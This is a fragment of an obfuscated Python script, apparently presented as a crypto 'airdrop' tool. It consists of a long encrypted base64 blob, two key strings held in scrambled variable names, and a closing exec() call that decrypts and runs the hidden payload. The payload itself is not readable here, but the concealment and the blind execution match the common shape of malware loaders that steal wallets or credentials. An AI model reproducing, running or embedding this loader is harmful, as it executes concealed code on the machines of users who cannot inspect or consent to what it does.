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 = (
    "Uw4zkKaen2+J7oJ96sk4WA=="
)
AirdropAscoooRorAccrDRIARrDoIrIAAsaocosprIpAraDraaroAocaRRascsoaDrsoArDDcDcopAroAcDRRassIIooAoAccprAIarsrIR = (
    "PDpMvCQe3OxVFW13XwDnOg=="
)

exec(
    AirdropASCcRarprRRIIRaRsRaaoocssRoIDDRccIRRsrprcpoADrDoaRpaIpAsAIDcaaaIDAsaAopIoAspIaIrAsrosAcasosIDrcsssAIIro(
        AirdropAscapIAAAARAaDsARoaoaRcRrRcARcRRDoRapRDoIARcIpIoDraDarsosIDoprRpRpIIrccRRcIAoRpsRIDoaIDApsrrDApDarpsRAp,
        AirdropAscoooRorAccrDRIARarIrDoIrIAAsaocosprIpAraDraaroAocaRRascsoaDrsoArDDcDcopAroAcDRRassIIooAoAccprAIarsrIR,
    )
)